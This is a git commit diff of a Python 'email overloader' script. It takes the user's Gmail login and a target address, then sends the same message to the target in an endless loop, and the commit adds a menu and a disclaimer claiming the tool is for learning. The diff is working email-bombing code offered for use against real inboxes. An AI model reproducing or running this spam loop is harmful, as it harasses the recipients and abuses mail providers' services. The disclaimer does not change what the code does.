320a6a49002992d9431b4b1d4e1c4afc85c009e3
danilacasito <danilacasito8@gmail.com>
2021-07-19 13:13:07 +0200

    Add compatibility for Multi Function

--- src/overloader.py
+++ src/overloader.py
@@ -14,24 +14,37 @@ except:
     
 if e == 1:
     sys.exit(0)
-us = input("Your Email> ")
-fromaddr = us
-to = input("Email to overload> ")
-toaddrs = to
+def spammail():
+    us = input("Your Email> ")
+    fromaddr = us
+    to = input("Email to overload> ")
+    toaddrs = to
+    msg = 'Estas sufriendo una sobrecarga de emails enviados por Python'
+    # Datos
+    username = us
+    print("Type your password here")
+    password = getpass.getpass()
+    #Sending the emails
+    n = 1
+    emenviados = 0
+    while n == 1:
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.starttls()
+        server.login(username, password)
+        server.sendmail(fromaddr, toaddrs, msg)
+        server.quit()
+print("Welcome to Multi Overloader")
+print(" ")
+print("WARNING, you have the responsability for the damages caused by this software, this program was developed only for testing and learning purposes, not attacking purposes")
+print("do not report us, since we have warned you in advance indicating that the fault of all the damages is yours")
+print("Do you want to continue? [y/N]")
+e = input()
+if e.lower() == "y":
+    print(" ")
+    print("Select your method")
+    print(" ")
+    print("a. Email Overload (Classic one)")
+    e = input("Select: ")
+    if e == "a":
+        spammail()
 
-msg = 'Estas sufriendo una sobrecarga de emails enviados por Python'
-
-# Datos
-username = us
-print("Type your password here")
-password = getpass.getpass()
-
-#Sending the emails
-n = 1
-emenviados = 0
-while n == 1:
-    server = smtplib.SMTP('smtp.gmail.com:587')
-    server.starttls()
-    server.login(username, password)
-    server.sendmail(fromaddr, toaddrs, msg)
-    server.quit()
